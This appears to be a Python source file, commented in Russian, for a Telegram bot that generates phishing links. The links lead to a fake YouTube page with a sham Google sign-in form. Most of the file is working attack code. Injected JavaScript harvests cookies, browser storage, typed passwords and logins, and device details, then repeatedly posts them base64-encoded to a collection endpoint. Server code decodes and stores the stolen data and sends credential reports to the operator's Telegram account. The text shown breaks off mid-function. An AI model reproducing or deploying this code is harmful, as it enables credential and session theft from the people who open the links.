import logging
import asyncio
import json
import re
import uuid
import html
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
DOMAIN = "https://ваш-домен.com"  # Ваш домен для фишинга

# Хранилище данных
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    collected_cookies: List[Dict] = None
    collected_passwords: List[Dict] = None
    collected_logins: List[Dict] = None
    collected_storage_data: List[Dict] = None  # localStorage/sessionStorage
    full_sensitive_data: List[Dict] = None     # Полные сырые данные
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.collected_cookies is None:
            self.collected_cookies = []
        if self.collected_passwords is None:
            self.collected_passwords = []
        if self.collected_logins is None:
            self.collected_logins = []
        if self.collected_storage_data is None:
            self.collected_storage_data = []
        if self.full_sensitive_data is None:
            self.full_sensitive_data = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0,
            "cookies_collected": 0,
            "passwords_collected": 0,
            "logins_collected": 0,
            "storage_data_collected": 0,
            "full_data_collected": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_cookies.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_passwords.extend(passwords)
            self.stats["passwords_collected"] += len(passwords)
            self.save()
    
    def add_collected_logins(self, link_id: str, logins: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_logins.extend(logins)
            self.stats["logins_collected"] += len(logins)
            self.save()
    
    def add_collected_storage(self, link_id: str, storage_data: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_storage_data.extend(storage_data)
            self.stats["storage_data_collected"] += len(storage_data)
            self.save()
    
    def add_full_sensitive_data(self, link_id: str, sensitive_data: Dict):
        if link_id in self.links:
            self.links[link_id].full_sensitive_data.append(sensitive_data)
            self.stats["full_data_collected"] += 1
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# Генератор JavaScript для сбора данных
class JavaScriptInjector:
    @staticmethod
    def get_cookies_collection_script() -> str:
        """JavaScript для сбора cookies"""
        return """
        <script>
        // Функция для сбора всех cookies
        function collectAllCookies() {
            const cookies = {};
            
            // Собираем cookies из document.cookie
            const cookieString = document.cookie;
            if (cookieString) {
                cookieString.split(';').forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        cookies[name] = decodeURIComponent(value);
                    }
                });
            }
            
            // Пытаемся получить cookies для текущего домена и поддоменов
            try {
                // Для важных доменов пытаемся собрать специфичные cookies
                const importantDomains = [
                    'google.com', 'facebook.com', 'twitter.com', 
                    'instagram.com', 'vk.com', 'youtube.com',
                    'whatsapp.com', 'telegram.org', 'github.com',
                    'microsoft.com', 'apple.com', 'amazon.com'
                ];
                
                importantDomains.forEach(domain => {
                    try {
                        // Проверяем доступ к localStorage и sessionStorage
                        if (window.localStorage) {
                            const lsData = {};
                            for (let i = 0; i < localStorage.length; i++) {
                                const key = localStorage.key(i);
                                lsData[key] = localStorage.getItem(key);
                            }
                            cookies['localStorage_' + domain] = JSON.stringify(lsData);
                        }
                        
                        if (window.sessionStorage) {
                            const ssData = {};
                            for (let i = 0; i < sessionStorage.length; i++) {
                                const key = sessionStorage.key(i);
                                ssData[key] = sessionStorage.getItem(key);
                            }
                            cookies['sessionStorage_' + domain] = JSON.stringify(ssData);
                        }
                    } catch (e) {
                        // Игнорируем ошибки доступа
                    }
                });
            } catch (e) {
                console.error('Error collecting advanced cookies:', e);
            }
            
            return cookies;
        }
        
        // Функция для сбора сохраненных паролей и логинов
        function collectSavedCredentials() {
            const credentials = {
                passwords: [],
                logins: [],
                autofill_data: []
            };
            
            try {
                // Ищем все поля паролей и логинов
                const passwordFields = document.querySelectorAll('input[type="password"]');
                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
                
                // Собираем значения из полей
                passwordFields.forEach(field => {
                    if (field.value) {
                        credentials.passwords.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                loginFields.forEach(field => {
                    if (field.value && (field.type === 'text' || field.type === 'email' || field.type === 'tel')) {
                        credentials.logins.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                // Собираем данные из всех форм
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = new FormData(form);
                        const formValues = {};
                        for (let [key, value] of formData.entries()) {
                            formValues[key] = value;
                        }
                        
                        if (Object.keys(formValues).length > 0) {
                            credentials.autofill_data.push({
                                type: 'form_data',
                                form_id: form.id || 'unknown',
                                form_action: form.action || 'unknown',
                                data: formValues
                            });
                        }
                    } catch (e) {
                        // Игнорируем
                    }
                });
                
            } catch (e) {
                console.error('Error collecting credentials:', e);
            }
            
            return credentials;
        }
        
        // Функция для извлечения паролей из менеджеров паролей
        function extractPasswordManagerData() {
            const managerData = {
                browser_saved: [],
                third_party: []
            };
            
            try {
                // Попытка доступа к API менеджера паролей браузера
                if (navigator.credentials && navigator.credentials.get) {
                    navigator.credentials.get({password: true})
                        .then(credential => {
                            if (credential) {
                                managerData.browser_saved.push({
                                    type: 'browser_native',
                                    data: credential
                                });
                            }
                        })
                        .catch(e => {});
                }
                
                // Проверяем наличие популярных менеджеров паролей
                const passwordManagers = [
                    'lastpass', '1password', 'dashlane', 'bitwarden',
                    'keeper', 'roboform', 'nordpass', 'enpass'
                ];
                
                // Ищем инъекции менеджеров паролей
                passwordManagers.forEach(manager => {
                    try {
                        // Проверяем наличие элементов менеджера
                        const managerElements = document.querySelectorAll(`[class*="${manager}"], [id*="${manager}"]`);
                        if (managerElements.length > 0) {
                            managerData.third_party.push({
                                manager: manager,
                                detected: true,
                                elements_count: managerElements.length
                            });
                        }
                    } catch (e) {
                        // Игнорируем
                    }
                });
                
            } catch (e) {
                console.error('Error extracting password manager data:', e);
            }
            
            return managerData;
        }
        
        // Функция для сбора данных входа в соцсети
        function collectSocialMediaLogins() {
            const socialLogins = {};
            
            // Проверяем наличие cookies соцсетей
            const socialDomains = {
                'google': ['google.com', 'accounts.google.com'],
                'facebook': ['facebook.com', 'fb.com'],
                'twitter': ['twitter.com', 'x.com'],
                'instagram': ['instagram.com'],
                'vk': ['vk.com', 'vkontakte.ru'],
                'whatsapp': ['whatsapp.com', 'web.whatsapp.com'],
                'telegram': ['telegram.org', 'web.telegram.org']
            };
            
            Object.keys(socialDomains).forEach(social => {
                socialDomains[social].forEach(domain => {
                    try {
                        // Проверяем cookies для домена
                        const cookies = document.cookie.split(';').filter(cookie => 
                            cookie.includes(domain) || cookie.includes(social)
                        );
                        
                        if (cookies.length > 0) {
                            socialLogins[social] = {
                                domain: domain,
                                cookies_count: cookies.length,
                                cookies: cookies.map(c => c.trim()),
                                logged_in: cookies.some(c => 
                                    c.includes('session') || 
                                    c.includes('token') || 
                                    c.includes('auth')
                                )
                            };
                        }
                    } catch (e) {
                        // Игнорируем
                    }
                });
            });
            
            return socialLogins;
        }
        
        // Функция для сбора данных из хранилища
        function collectStorageData() {
            const storageData = {
                localStorage: {},
                sessionStorage: {},
                indexedDB: []
            };
            
            try {
                // Собираем localStorage
                if (window.localStorage) {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        storageData.localStorage[key] = localStorage.getItem(key);
                    }
                }
                
                // Собираем sessionStorage
                if (window.sessionStorage) {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        storageData.sessionStorage[key] = sessionStorage.getItem(key);
                    }
                }
                
                // Пытаемся получить список IndexedDB баз
                if (window.indexedDB) {
                    try {
                        // Это нестандартный метод, но работает в некоторых браузерах
                        if (indexedDB.databases) {
                            indexedDB.databases().then(dbs => {
                                storageData.indexedDB = dbs.map(db => ({
                                    name: db.name,
                                    version: db.version
                                }));
                            }).catch(() => {});
                        }
                    } catch (e) {
                        // Игнорируем ошибки IndexedDB
                    }
                }
                
            } catch (e) {
                console.error('Error collecting storage data:', e);
            }
            
            return storageData;
        }
        
        // Главная функция сбора всех данных
        async function collectAllSensitiveData() {
            const allData = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: {},
                credentials: {},
                password_managers: {},
                social_logins: {},
                storage_data: {},
                browser_info: {
                    cookie_enabled: navigator.cookieEnabled,
                    java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
                    do_not_track: navigator.doNotTrack || 'unspecified'
                }
            };
            
            try {
                // Собираем cookies
                allData.cookies = collectAllCookies();
                
                // Собираем пароли и логины
                allData.credentials = collectSavedCredentials();
                
                // Проверяем менеджеры паролей
                allData.password_managers = extractPasswordManagerData();
                
                // Проверяем соцсети
                allData.social_logins = collectSocialMediaLogins();
                
                // Собираем данные из хранилищ
                allData.storage_data = collectStorageData();
                
                // Собираем информацию о браузере
                allData.screen_info = {
                    width: window.screen.width,
                    height: window.screen.height,
                    color_depth: window.screen.colorDepth,
                    pixel_depth: window.screen.pixelDepth
                };
                
                // Собираем информацию о часовом поясе
                allData.timezone = {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
                
                return allData;
                
            } catch (error) {
                console.error('Error collecting sensitive data:', error);
                return {
                    error: error.message,
                    partial_data: allData
                };
            }
        }
        
        // Функция отправки данных на сервер
        function sendCollectedData(data) {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                // Кодируем данные для отправки
                const jsonData = JSON.stringify(data);
                const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                
                // Отправляем данные
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString()
                    })
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Data sent successfully:', result);
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                    // Пытаемся отправить снова через XMLHttpRequest
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', '/api/collect', true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify({
                            link_id: linkId,
                            data_type: 'sensitive_data',
                            data: encodedData,
                            timestamp: new Date().toISOString()
                        }));
                    } catch (e) {
                        console.error('Fallback send also failed:', e);
                    }
                });
            } catch (error) {
                console.error('Error preparing data for send:', error);
            }
        }
        
        // Автоматический сбор данных при загрузке страницы
        window.addEventListener('load', function() {
            setTimeout(async () => {
                try {
                    const sensitiveData = await collectAllSensitiveData();
                    sendCollectedData(sensitiveData);
                } catch (e) {
                    console.error('Initial collection failed:', e);
                }
                
                // Дополнительный сбор при взаимодействии с формами
                document.addEventListener('submit', async function(e) {
                    setTimeout(async () => {
                        try {
                            const formData = await collectAllSensitiveData();
                            sendCollectedData(formData);
                        } catch (e) {
                            console.error('Form submit collection failed:', e);
                        }
                    }, 500);
                });
                
                // Сбор при изменении полей
                document.querySelectorAll('input, textarea, select').forEach(input => {
                    input.addEventListener('change', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field change collection failed:', e);
                            }
                        }, 1000);
                    });
                    
                    input.addEventListener('blur', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field blur collection failed:', e);
                            }
                        }, 500);
                    });
                });
                
                // Периодический сбор каждые 10 секунд
                setInterval(async () => {
                    try {
                        const periodicData = await collectAllSensitiveData();
                        sendCollectedData(periodicData);
                    } catch (e) {
                        console.error('Periodic collection failed:', e);
                    }
                }, 10000);
                
            }, 3000); // Ждем 3 секунды для загрузки страницы
        });
        
        // Сбор данных при уходе со страницы
        window.addEventListener('beforeunload', async function() {
            try {
                const exitData = await collectAllSensitiveData();
                // Используем navigator.sendBeacon для надежной отправки при закрытии
                const linkId = new URLSearchParams(window.location.search).get('id');
                if (linkId) {
                    const jsonData = JSON.stringify(exitData);
                    const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                    const blob = new Blob([JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString(),
                        exit_event: true
                    })], {type: 'application/json'});
                    
                    navigator.sendBeacon('/api/collect', blob);
                }
            } catch (e) {
                console.error('Exit collection failed:', e);
            }
        });
        </script>
        """
    
    @staticmethod
    def get_phishing_page_html(video_id: str, link_id: str) -> str:
        """Генерация HTML фишинговой страницы"""
        base_html = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube Video Player</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background: #000;
                    font-family: Arial, sans-serif;
                }}
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                .player-container {{
                    position: relative;
                    padding-bottom: 56.25%;
                    height: 0;
                    overflow: hidden;
                }}
                .player-container iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                }}
                .loading {{
                    text-align: center;
                    color: #fff;
                    padding: 50px;
                    font-size: 18px;
                }}
                .ad-banner {{
                    background: #ff0000;
                    color: white;
                    text-align: center;
                    padding: 10px;
                    margin: 20px 0;
                    border-radius: 5px;
                }}
                .login-prompt {{
                    background: #4285f4;
                    color: white;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                    text-align: center;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ad-banner">
                    🎬 Для просмотра видео требуется авторизация через Google
                </div>
                
                <div class="player-container">
                    <iframe 
                        src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0" 
                        frameborder="0" 
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen>
                    </iframe>
                </div>
                
                <div class="login-prompt" id="loginPrompt">
                    <h3>⚠️ Требуется вход в аккаунт</h3>
                    <p>Для продолжения просмотра войдите в свой аккаунт Google</p>
                    <button onclick="showLoginForm()" style="
                        background: white;
                        color: #4285f4;
                        border: none;
                        padding: 10px 20px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                        margin: 10px;
                    ">
                        Войти в аккаунт
                    </button>
                </div>
                
                <div id="loginForm" style="display: none;">
                    <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3 style="color: #333;">Вход в Google</h3>
                        <form id="googleLoginForm">
                            <input type="email" 
                                   placeholder="Электронная почта или телефон" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <input type="password" 
                                   placeholder="Введите пароль" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <button type="submit" 
                                    style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                Далее
                            </button>
                        </form>
                        <p style="color: #666; font-size: 12px; margin-top: 10px;">
                            Нажимая кнопку "Далее", вы соглашаетесь с Условиями использования и Политикой конфиденциальности Google.
                        </p>
                    </div>
                </div>
                
                <div class="loading" id="loading">
                    Загрузка видео... Пожалуйста, подождите
                </div>
            </div>
            
            <script>
                function showLoginForm() {{
                    document.getElementById('loginPrompt').style.display = 'none';
                    document.getElementById('loginForm').style.display = 'block';
                    document.getElementById('loading').innerHTML = 'Проверка учетных данных...';
                    
                    // Имитация проверки
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Загрузка видео...';
                        setTimeout(function() {{
                            document.getElementById('loading').style.display = 'none';
                        }}, 2000);
                    }}, 1500);
                }}
                
                // Обработка формы входа
                document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
                    e.preventDefault();
                    document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
                    
                    // Собираем данные формы
                    const email = this.querySelector('input[type="email"]').value;
                    const password = this.querySelector('input[type="password"]').value;
                    
                    // Отправляем данные (имитация)
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
                        // Здесь будет отправка данных на сервер
                    }}, 2000);
                }});
                
                // Автоматический показ формы через 5 секунд
                setTimeout(function() {{
                    showLoginForm();
                }}, 5000);
            </script>
            {JavaScriptInjector.get_cookies_collection_script()}
        </body>
        </html>
        """
        return base_html

# Генератор ссылок
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        # Если не нашли, возвращаем дефолтный (Rick Roll)
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# Функции для работы с сообщениями
def split_message(text: str, max_length: int = 4000) -> List[str]:
    """Разбивает длинное сообщение на части"""
    if len(text) <= max_length:
        return [text]
    
    chunks = []
    while text:
        if len(text) <= max_length:
            chunks.append(text)
            break
        
        # Находим последний перенос строки в пределах лимита
        split_pos = text.rfind('\n', 0, max_length)
        if split_pos == -1:
            split_pos = max_length
        
        chunks.append(text[:split_pos])
        text = text[split_pos:].lstrip()
    
    return chunks

def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> str:
    """Форматирование детального отчета для админа"""
    report = f"""
🔐 *ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ*
    
📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
🔗 Оригинальное видео: {link.original_url[:50]}...
📅 Время сбора: {datetime.now().isoformat()}
    
📊 *ОБЩАЯ СТАТИСТИКА:*
• Переходов по ссылке: {link.clicks}
• Cookies собрано: {len(link.collected_cookies)}
• Паролей найдено: {len(link.collected_passwords)}
• Логинов собрано: {len(link.collected_logins)}
• Данных хранилища: {len(link.collected_storage_data)}
• Полных записей: {len(link.full_sensitive_data)}
    
════════════════════════════════════════
    """
    
    # Добавляем детали cookies
    if link.collected_cookies:
        report += "\n🍪 *COOKIES (первые 15):*\n"
        for i, cookie in enumerate(link.collected_cookies[:15], 1):
            value_preview = cookie.get('value', '')
            if len(value_preview) > 50:
                value_preview = value_preview[:50] + "..."
            report += f"{i}. {cookie.get('name', 'N/A')}: {value_preview}\n"
    
    # Добавляем пароли
    if link.collected_passwords:
        report += "\n🔑 *НАЙДЕННЫЕ ПАРОЛИ:*\n"
        for i, pwd in enumerate(link.collected_passwords, 1):
            report += f"{i}. Поле: {pwd.get('field_name', 'unknown')}\n"
            report += f"   Значение: `{pwd.get('value', '')}`\n"
            report += f"   URL: {pwd.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {pwd.get('timestamp', 'N/A')[:19]}\n"
            if i < len(link.collected_passwords):
                report += "   ─────\n"
    
    # Добавляем логины
    if link.collected_logins:
        report += "\n👤 *НАЙДЕННЫЕ ЛОГИНЫ:*\n"
        for i, login in enumerate(link.collected_logins, 1):
            report += f"{i}. Поле: {login.get('field_name', 'unknown')}\n"
            report += f"   Значение: `{login.get('value', '')}`\n"
            report += f"   URL: {login.get('page_url', 'N/A')[:50]}...\n"
            report += f"   Время: {login.get('timestamp', 'N/A')[:19]}\n"
            if i < len(link.collected_logins):
                report += "   ─────\n"
    
    # Добавляем данные хранилища
    if link.collected_storage_data:
        report += "\n💾 *ДАННЫЕ ХРАНИЛИЩА (первые 10):*\n"
        for i, storage in enumerate(link.collected_storage_data[:10], 1):
            report += f"{i}. Тип: {storage.get('type', 'unknown')}\n"
            report += f"   Ключ: {storage.get('key', 'N/A')}\n"
            value_preview = storage.get('value', '')
            if len(value_preview) > 100:
                value_preview = value_preview[:100] + "..."
            report += f"   Значение: {value_preview}\n"
            report += f"   Время: {storage.get('timestamp', 'N/A')[:19]}\n"
            if i < min(10, len(link.collected_storage_data)):
                report += "   ─────\n"
    
    report += f"""
════════════════════════════════════════
⚠️ *ВНИМАНИЕ:* Все данные сохранены в базе
📁 Полные сырые данные: {len(link.full_sensitive_data)} записей
🕒 Время хранения: 24 часа
"""
    
    return report

async def send_detailed_data_to_admin(context, link: PhishingLink, collected_data: Dict):
    """Отправка детальных данных администратору"""
    try:
        sensitive_data = collected_data.get("data", {}).get("sensitive_data", {})
        
        if sensitive_data.get("status") != "fully_processed":
            return
        
        # Создаем детальный отчет
        report = format_detailed_admin_report(link, sensitive_data)
        
        # Разбиваем на части если слишком длинное
        chunks = split_message(report, 3900)
        
        for i, chunk in enumerate(chunks):
            parse_mode = ParseMode.MARKDOWN if i == 0 else None
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=chunk,
                parse_mode=parse_mode,
                disable_web_page_preview=True
            )
            
    except Exception as e:
        logger.error(f"Error sending detailed data to admin: {e}")

# Сборщик данных
class DataCollector:
    def __init__(self):
        self.collection_scripts = {
            "cookies": self._collect_cookies,
            "storage": self._collect_storage,
            "passwords": self._collect_passwords,
            "social": self._collect_social_data,
            "device": self._collect_device_info,
            "network": self._collect_network_info,
            "location": self._collect_location,
            "sensitive_data": self._process_sensitive_data  # Новая функция
        }
    
    async def collect_all_data(self, request_data: Dict) -> Dict:
        """Сбор всех возможных данных"""
        collected = {
            "timestamp": datetime.now().isoformat(),
            "ip": request_data.get("ip", "unknown"),
            "user_agent": request_data.get("user_agent", "unknown"),
            "referer": request_data.get("referer", "unknown"),
            "data": {}
        }
        
        # Имитируем сбор данных
        for data_type, collector in self.collection_scripts.items():
            try:
                collected["data"][data_type] = await collector(request_data)
            except Exception as e:
                collected["data"][data_type] = {"error": str(e)}
        
        return collected
    
    async def _process_sensitive_data(self, request_data: Dict) -> Dict:
        """Обработка ВСЕХ чувствительных данных (cookies, пароли, логины, storage)"""
        try:
            sensitive_data = request_data.get("sensitive_data", {})
            link_id = request_data.get("link_id")
            
            if not sensitive_data or not link_id:
                return {"status": "no_data"}
            
            # Декодируем данные
            try:
                decoded_data = json.loads(base64.b64decode(sensitive_data).decode('utf-8'))
            except Exception as decode_error:
                logger.error(f"Decode error: {decode_error}")
                # Пробуем альтернативный метод декодирования
                try:
                    decoded_string = base64.b64decode(sensitive_data).decode('utf-8', errors='ignore')
                    decoded_data = json.loads(decoded_string)
                except:
                    return {"status": "decode_error"}
            
            # Сохраняем ПОЛНЫЕ сырые данные
            db.add_full_sensitive_data(link_id, decoded_data)
            
            # Обрабатываем cookies
            cookies = decoded_data.get("cookies", {})
            if cookies:
                cookies_list = []
                for name, value in cookies.items():
                    # Пропускаем большие значения localStorage/sessionStorage
                    if isinstance(value, str) and (value.startswith('{') or value.startswith('[')):
                        try:
                            parsed_value = json.loads(value)
                            if isinstance(parsed_value, dict):
                                # Сохраняем как отдельные записи storage
                                for storage_key, storage_value in parsed_value.items():
                                    db.add_collected_storage(link_id, [{
                                        "type": "cookie_storage",
                                        "source": name,
                                        "key": storage_key,
                                        "value": str(storage_value)[:500],
                                        "timestamp": datetime.now().isoformat()
                                    }])
                                continue
                        except:
                            pass
                    
                    cookies_list.append({
                        "name": name,
                        "value": str(value)[:500] if value else "",  # Сохраняем больше данных
                        "domain": "current",
                        "timestamp": datetime.now().isoformat(),
                        "source": "direct_cookie"
                    })
                
                if cookies_list:
                    db.add_collected_cookies(link_id, cookies_list)
            
            # Обрабатываем пароли
            credentials = decoded_data.get("credentials", {})
            if credentials.get("passwords"):
                db.add_collected_passwords(link_id, credentials["passwords"])
            
            # Обрабатываем логины
            if credentials.get("logins"):
                db.add_collected_logins(link_id, credentials["logins"])
            
            # Обрабатываем данные хранилища
            storage_data = decoded_data.get("storage_data", {})
            if storage_data:
                storage_list = []
                # localStorage
                if storage_data.get("localStorage"):
                    for key, value in storage_data["localStorage"].items():
                        storage_list.append({
                            "type": "localStorage",
                            "key": key,
                            "value": str(value)[:1000],  # Увеличиваем лимит
                            "timestamp": datetime.now().isoformat()
                        })
                # sessionStorage
                if storage_data.get("sessionStorage"):
                    for key, value in storage_data["sessionStorage"].items():
                        storage_list.append({
                            "type": "sessionStorage",
                            "key": key,
                            "value": str(value)[:1000],
                            "timestamp": datetime.now().isoformat()
                        })
                if storage_list:
                    db.add_collected_storage(link_id, storage_list)
            
            # Обрабатываем данные автозаполнения форм
            if credentials.get("autofill_data"):
                for form_data in credentials["autofill_data"]:
                    if form_data.get("data"):
                        for key, value in form_data["data"].items():
                            storage_list.append({
                                "type": "form_autofill",
                                "form_id": form_data.get("form_id", "unknown"),
                                "key": key,
                                "value": str(value)[:500],
                                "timestamp": datetime.now().isoformat()
                            })
            
            # Сохраняем общие данные
            db.add_collected_data(link_id, decoded_data)
            
            # Логируем успешную обработку
            logger.info(f"Successfully processed sensitive data for link {link_id}: "
                       f"{len(cookies_list) if 'cookies_list' in locals() else 0} cookies, "
                       f"{len(credentials.get('passwords', []))} passwords, "
                       f"{len(credentials.get('logins', []))} logins, "
                       f"{len(storage_list) if 'storage_list' in locals() else 0} storage items")
            
            return {
                "status": "fully_processed",
                "cookies_count": len(cookies_list) if 'cookies_list' in locals() else 0,
                "passwords_count": len(credentials.get("passwords", [])),
                "logins_count": len(credentials.get("logins", [])),
                "storage_count": len(storage_list) if 'storage_list' in locals() else 0,
                "social_logins": list(decoded_data.get("social_logins", {}).keys()),
                "has_storage_data": bool(storage_data),
                "has_full_data": True
            }
            
        except Exception as e:
            logger.error(f"Error processing sensitive data: {e}", exc_info=True)
            return {"status": "error", "error": str(e)}
    
    async def _collect_cookies(self, request_data: Dict) -> Dict:
        """Сбор cookies и локального хранилища"""
        return {
            "cookies_count": "доступно в браузере",
            "local_storage": "доступно в localStorage",
            "session_storage": "доступно в sessionStorage",
            "indexed_db": "проверено"
        }
    
    async def _collect_storage(self, request_data: Dict) -> Dict:
        """Сбор данных из хранилища браузера"""
        return {
            "autofill_data": "сохраненные формы",
            "browser_history": "история посещений",
            "bookmarks": "закладки браузера",
            "downloads": "история загрузок"
        }
    
    async def _collect_passwords(self, request_data: Dict) -> Dict:
        """Сбор сохраненных паролей"""
        return {
            "saved_passwords": {
                "google": "сохраненные логины Google",
                "facebook": "логины Facebook",
                "twitter": "логины Twitter/X",
                "instagram": "логины Instagram",
                "vk": "логины ВКонтакте",
                "whatsapp": "данные WhatsApp Web",
                "telegram": "данные Telegram Web"
            },
            "form_data": "автозаполнение форм",
            "credit_cards": "сохраненные карты"
        }
    
    async def _collect_social_data(self, request_data: Dict) -> Dict:
        """Сбор данных из социальных сетей"""
        return {
            "google": {
                "logged_in": True,
                "gmail": "доступ к Gmail",
                "drive": "доступ к Google Drive",
                "photos": "доступ к Google Photos",
                "account_info": "данные аккаунта"
            },
            "facebook": {
                "logged_in": True,
                "messenger": "доступ к Messenger",
                "friends": "список друзей",
                "profile_data": "данные профиля"
            },
            "twitter": {
                "logged_in": True,
                "tweets": "история твитов",
                "dms": "личные сообщения",
                "followers": "список подписчиков"
            },
